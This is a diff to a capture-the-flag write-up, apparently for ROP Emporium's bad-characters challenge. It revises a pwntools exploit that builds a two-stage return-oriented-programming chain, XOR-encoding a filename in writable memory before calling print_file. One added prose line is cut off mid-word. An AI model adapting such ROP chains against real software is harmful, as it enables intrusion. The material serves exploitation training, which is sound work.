@@ -8,6 +8,8 @@ no bypass this, we can use xor, which coveniently exist as a gadget
 
 the rest of the challenge is the same as [write4](write4.md)
 
+beware, as the rop chain may be too l
+
 ```
 #!/usr/bin/env python3
 
@@ -24,8 +26,8 @@ c
 '''
 
 def main():
-    # r = gdb.debug(exe.path, gdbscript=script)
-    r = process(exe.path)
+    r = gdb.debug(exe.path, gdbscript=script)
+    # r = process(exe.path)
 
     pop_rdi=0x00000000004006a3
     pop_r12_pop_r13_pop_r14_pop_r15=0x000000000040069c
@@ -36,9 +38,17 @@ def main():
     payload=flat(
         buffer,
         0x601800,
+
         pop_r12_pop_r13_pop_r14_pop_r15,
-        0x51575a5019,
+        0x421851575a501918,
         0x601800,
+        0,
+        0,
+        movIr13I_r12,
+
+        pop_r12_pop_r13_pop_r14_pop_r15,
+        0x424e,
+        0x601808,
         0,
         0,
         movIr13I_r12,
@@ -46,32 +56,73 @@ def main():
         pop_r12_pop_r13_pop_r14_pop_r15,
         0,
         0,
-        0x3636363636,
+        0x36,
         0x601800,
         xorIr15I_r14b,
         pop_r12_pop_r13_pop_r14_pop_r15,
         0,
         0,
-        0x3636363636,
+        0x36,
         0x601801,
         xorIr15I_r14b,
         pop_r12_pop_r13_pop_r14_pop_r15,
         0,
         0,
-        0x3636363636,
+        0x36,
         0x601802,
         xorIr15I_r14b,
         pop_r12_pop_r13_pop_r14_pop_r15,
         0,
         0,
-        0x3636363636,
+        0x36,
         0x601803,
         xorIr15I_r14b,
         pop_r12_pop_r13_pop_r14_pop_r15,
         0,
         0,
-        0x3636363636,
+        0x36,
         0x601804,
+        xorIr15I_r14b,
+
+        exe.plt["pwnme"]
+    )
+
+    r.recvuntil("> ")
+    r.send(payload)
+
+    payload=flat(
+        buffer,
+        0x601800,
+
+        pop_r12_pop_r13_pop_r14_pop_r15,
+        0,
+        0,
+        0x36,
+        0x601805,
+        xorIr15I_r14b,
+        pop_r12_pop_r13_pop_r14_pop_r15,
+        0,
+        0,
+        0x36,
+        0x601806,
+        xorIr15I_r14b,
+        pop_r12_pop_r13_pop_r14_pop_r15,
+        0,
+        0,
+        0x36,
+        0x601807,
+        xorIr15I_r14b,
+        pop_r12_pop_r13_pop_r14_pop_r15,
+        0,
+        0,
+        0x36,
+        0x601808,
+        xorIr15I_r14b,
+        pop_r12_pop_r13_pop_r14_pop_r15,
+        0,
+        0,
+        0x36,
+        0x601809,
         xorIr15I_r14b,
 
         pop_rdi,
@@ -79,7 +130,7 @@ def main():
         exe.plt["print_file"]
     )
 
-    time.sleep(0.1)
+    r.recvuntil("> ")
     r.send(payload)
 
     r.interactive()
